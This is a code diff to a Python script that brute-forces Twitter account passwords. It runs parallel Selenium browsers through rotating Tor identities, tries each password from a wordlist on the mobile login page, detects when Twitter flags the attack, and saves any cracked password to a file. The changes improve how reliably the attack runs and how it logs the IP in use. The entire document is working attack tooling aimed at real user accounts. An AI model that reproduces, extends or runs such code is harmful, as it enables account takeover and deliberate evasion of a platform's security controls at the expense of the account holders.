@@ -2,7 +2,7 @@ import argparse
 import multiprocessing
 import os
 import tempfile
-from asyncio import sleep
+from time import sleep
 from os.path import join
 
 from pyvirtualdisplay import Display
@@ -37,7 +37,7 @@ class TorExecutorSettings:
 
     def __init__(self,
                  # how many tor instances you want to run
-                 jobs_in_parallel=15,
+                 jobs_in_parallel=10,
                  # if you want to switch identity after every attempt
                  switch_identity=True,
                  switch_identity_sleep=2,
@@ -127,7 +127,7 @@ def launch_tor(settings):
 def load_wlist(wlist):
     # open pass word list
     if not os.path.isfile(wlist):
-        print(R + ("   WLIST NOT FOUND") + W)
+        print(R + ("   ERROR \t| Password list file was not found.") + W)
         exit(0)
     with open(wlist) as words:
         # read all lines (== passwords)
@@ -135,7 +135,7 @@ def load_wlist(wlist):
         for word in lines:
             # queue passwords
             PASSWORDS.put(word.strip("\n"))
-    print(G + ("   WLIST PARSED \t| Size: {}".format(str(PASSWORDS.qsize()))) + W)
+    print(G + ("   QUEUE \t| Size: {}".format(str(PASSWORDS.qsize()))) + W)
 
     # noinspection PyBroadException
 
@@ -146,6 +146,12 @@ def bruteforce(driver):
     has exactly one argument driver
     """
     password = PASSWORDS.get()  # get new password from synced queue
+
+    driver.get("http://ip.42.pl/raw")
+    WebDriverWait(driver, 30).until(
+        ec.presence_of_element_located((By.TAG_NAME, "body")))
+    ip = driver.find_element_by_tag_name("body").text
+
     driver.get("https://mobile.twitter.com/session/new")  # load twitter login page in browser
     try:
         # confirm to continue with js disabled (if neccessaray)
@@ -171,50 +177,51 @@ def bruteforce(driver):
 
     # select password field
     twit_pw = driver.find_element_by_name("session[password]")
-
     # clear password field
     twit_pw.clear()
     # inser given password from list
     twit_pw.send_keys(password)
     # hit return to try login
     twit_pw.send_keys(Keys.RETURN)
-    # wait for result (just to be sure)
-
+    # wait for result
+    sleep(2)
+    WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
     # get current url
     url = driver.current_url
-
+    print(url)
+    if "https://mobile.twitter.com/login/check" in url:
+        print(R + (
+            "   WARNING \t| Twitter probably found out your attacking this account.".format(USERNAME, password)) + W)
     # if it fails you land on /session/new or /login/check
-    if "https://mobile.twitter.com/session/new" not in url \
-            and "https://mobile.twitter.com/login/check" not in url:
+    elif "https://mobile.twitter.com/session/new" not in url:
         # if thats not the case we found the password!
-        print(G + ("    Username: {} \t| Password found: {} \n".format(USERNAME, password)) + W)
+        print(G + ("   SUCCESS \t| Username: {} \t| Password found: {} \n".format(USERNAME, password)) + W)
 
         # be sure to let you know what you found
         with open("FOUND.txt", "w") as file:
             file.write(("SUCCESS | Username: {} \t| Password: {} \n".format(USERNAME, password)))
+            file.close()
 
         # stop all running proccesses
         tor_executor.stop()
     #  if not found it continues to get current ip address used
-    driver.get("http://ip.42.pl/raw")
-    WebDriverWait(driver, 30).until(
-        ec.presence_of_element_located((By.TAG_NAME, "body")))
     # log the failure with username, password and ip
     print(O + ("   FAILED \t| Username: {} \t|  IP: {} \t| Password: {} "
-               .format(USERNAME,
-                       driver.find_element_by_tag_name("body").text, password) + W))
+               .format(USERNAME, ip, password) + W))
 
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Bruteforce twitter account')
     parser.add_argument('username', type=str,
-                        help='enter username to attack')
+                        help='choose username to attack')
     parser.add_argument('wlist', type=str,
-                        help='enter path to wlist / password list')
+                        help='provide path to wlist / password list')
     parser.add_argument('tor', type=str,
                         help='provide path to tor binaries')
     parser.add_argument('-instances', type=int,
-                        help='amount of tor instances running in parallel')
+                        help='amount of tor instances you want to run parallel')
+    parser.add_argument('--screen', const=True, default=False, nargs='?',
+                        help='when set to true shows you the browser tabs')
 
     args = parser.parse_args()
     # load all words from password list
@@ -223,9 +230,11 @@ if __name__ == '__main__':
     # set username
     USERNAME = args.username
 
-    tor_exec_settings = TorExecutorSettings(tor_dir=args.tor) if not args.instances else TorExecutorSettings(
-        tor_dir=args.tor,
-        jobs_in_parallel=args.instances)
+    tor_exec_settings = TorExecutorSettings(tor_dir=args.tor)
+    if args.instances is not None:
+        tor_exec_settings.jobs_in_parallel = args.instances
+    if args.screen is not None and args.screen:
+        tor_exec_settings.headless = False
     # executor is a multithreading, identity switching service
     tor_executor = TorExecutor(bruteforce, tor_exec_settings)
     # start tor executor
